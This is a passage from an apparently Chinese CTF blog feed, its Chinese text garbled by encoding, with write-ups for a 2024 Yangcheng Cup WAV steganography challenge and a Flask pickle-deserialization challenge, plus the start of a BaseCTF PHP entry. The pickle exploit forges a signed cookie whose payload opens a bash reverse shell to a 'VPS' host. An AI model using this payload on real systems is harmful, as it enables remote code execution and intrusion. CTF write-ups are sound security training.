title="ä½¿ç”¨å¼‚å¸¸çš„æŠ€å·§"></a>ä½¿ç”¨å¼‚å¸¸çš„æŠ€å·§</h3><ol><li>å¼‚å¸¸å¤„ç†ä¸èƒ½ä»£æ›¿ç®€å•çš„æµ‹è¯•ã€‚</li><li>ä¸è¦è¿‡åˆ†åœ°ç»†åŒ–å¼‚å¸¸ã€‚</li><li>å……åˆ†åˆ©ç”¨å¼‚å¸¸å±‚æ¬¡ç»“æ„ã€‚</li><li>ä¸è¦å‹åˆ¶å¼‚å¸¸ã€‚</li><li>åœ¨æ£€æµ‹é”™è¯¯æ—¶ï¼Œâ€œè‹›åˆ»â€™è¦æ¯”æ”¾ä»»æ›´å¥½ã€‚</li><li>ä¸è¦ç¾äºä¼ é€’å¼‚å¸¸ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024ç¾ŠåŸæ¯</title>
      <link href="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
      <url>/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h4 id="Hiden"><a href="#Hiden" class="headerlink" title="Hiden"></a>Hiden</h4><p>å¯¹åŸæœ‰æ–‡æœ¬è¿›è¡Œrot47å’Œrot13è§£å¯†å¾—åˆ°wavçš„åŠ å¯†è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> wave <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    txt_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    file_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>txt_data<span class="token punctuation">)</span>    txt_data <span class="token operator">=</span> file_len<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> byteorder <span class="token operator">=</span> <span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token operator">+</span> txt_data<span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.wav"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    attrib <span class="token operator">=</span> f<span class="token punctuation">.</span>getparams<span class="token punctuation">(</span><span class="token punctuation">)</span>        wav_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span> f<span class="token punctuation">.</span>readframes<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>txt_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    wav_data<span class="token punctuation">[</span>index <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> txt_data<span class="token punctuation">[</span>index<span class="token punctuation">]</span>    <span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"hiden.wav"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>setparams<span class="token punctuation">(</span>attrib<span class="token punctuation">)</span>     f<span class="token punctuation">.</span>writeframes<span class="token punctuation">(</span>wav_data<span class="token punctuation">)</span></code></pre><p>å¯¹è„šæœ¬è¿›è¡Œé€†å‘å³å¯å¾—åˆ°flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> wave<span class="token keyword">with</span> wave<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"hiden.wav"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    attrib <span class="token operator">=</span> f<span class="token punctuation">.</span>getparams<span class="token punctuation">(</span><span class="token punctuation">)</span>    wav_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readframes<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>hidden_data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>wav_data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hidden_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>wav_data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>file_len <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hidden_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>extracted_data <span class="token operator">=</span> hidden_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span>file_len <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>extracted_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="hidden.png" loading="lazy"></p><h4 id="Lyrics-For-You-pickleååºåˆ—åŒ–"><a href="#Lyrics-For-You-pickleååºåˆ—åŒ–" class="headerlink" title="Lyrics For You(pickleååºåˆ—åŒ–)"></a>Lyrics For You(pickleååºåˆ—åŒ–)</h4><p>é€šè¿‡æ–‡ä»¶è¯»å–è¯»å–æºç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># app.py</span><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token comment"># from config.secret_key import secret_code</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> cookie <span class="token keyword">import</span> set_cookie<span class="token punctuation">,</span> cookie_check<span class="token punctuation">,</span> get_cookie<span class="token keyword">import</span> pickleapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> random<span class="token punctuation">.</span>randbytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">UserData</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token keyword">def</span> <span class="token function">Waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/lyrics"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain; charset=UTF-8'</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"lyrics"</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/lyrics"</span><span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            res <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No lyrics found"</span>    <span class="token keyword">return</span> res<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> UserData<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> res<span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/board"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">board</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    invalid <span class="token operator">=</span> cookie_check<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> invalid<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Nope, invalid code get out!"</span>    data <span class="token operator">=</span> get_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>åˆ†æ<code>cookie.py</code>é€»è¾‘,æ„é€ expå¦‚ä¸‹ï¼Œç›´æ¥åå¼¹shell</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> hmac<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> make_response<span class="token punctuation">,</span> request<span class="token builtin">unicode</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token builtin">basestring</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token comment"># Quoted from python bottle template, thanks :D</span><span class="token keyword">def</span> <span class="token function">cookie_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span> <span class="token operator">+</span> sig <span class="token operator">+</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token operator">+</span> msg<span class="token keyword">def</span> <span class="token function">cookie_decode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word <span class="token keyword">in</span> data<span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment"># print(word)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token keyword">def</span> <span class="token function">cookie_check</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">:</span>        <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                <span class="token keyword">if</span> waf<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">tob</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">unicode</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_cookie</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    value <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    <span class="token keyword">if</span> secret <span class="token keyword">and</span> value<span class="token punctuation">:</span>        dec <span class="token operator">=</span> cookie_decode<span class="token punctuation">(</span>value<span class="token punctuation">,</span> secret<span class="token punctuation">)</span>        <span class="token keyword">return</span> dec<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> dec <span class="token keyword">and</span> dec<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> key <span class="token keyword">else</span> default    <span class="token keyword">return</span> value <span class="token keyword">or</span> default<span class="token keyword">def</span> <span class="token function">cookie_is_encoded</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_lscmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token keyword">if</span> x <span class="token operator">==</span> y <span class="token keyword">else</span> <span class="token number">1</span> <span class="token keyword">for</span> x<span class="token punctuation">,</span> y <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_cookie</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> secret<span class="token punctuation">:</span>        value <span class="token operator">=</span> touni<span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> resp    <span class="token keyword">elif</span> <span class="token keyword">not</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token builtin">basestring</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> TypeError<span class="token punctuation">(</span><span class="token string">'Secret key missing for non-string Cookie.'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">4096</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">'Cookie value to long.'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touni</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> enc<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">,</span> err<span class="token operator">=</span><span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>enc<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token builtin">unicode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>opcode<span class="token operator">=</span><span class="token triple-quoted-string string">b'''(cossystemS'bash -c "bash -i >&amp; /dev/tcp/VPS/5678 0>&amp;1"'o.'''</span>secret<span class="token operator">=</span><span class="token string">"EnjoyThePlayTime123456"</span>exp <span class="token operator">=</span> touni<span class="token punctuation">(</span>cookie_encode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span> opcode<span class="token punctuation">)</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¾ŠåŸæ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF2024-web</title>
      <link href="/2024/08/18/BaseCTF2024-web/"/>
      <url>/2024/08/18/BaseCTF2024-web/</url>
      
        <content type="html"><![CDATA[<h4 id="Aura-é…±çš„ç¤¼ç‰©-url"><a href="#Aura-é…±çš„ç¤¼ç‰©-url" class="headerlink" title="Aura é…±çš„ç¤¼ç‰©(url@)"></a>Aura é…±çš„ç¤¼ç‰©(url@)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Aura é…±ï¼Œæ¬¢è¿å›å®¶~ </span><span class="token comment">// è¿™é‡Œæœ‰ä¸€ä»½ç¤¼ç‰©ï¼Œè¯·ä½ ç­¾æ”¶ä¸€ä¸‹å“Ÿ~ </span><span class="token variable">$pen</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pen</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Aura'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  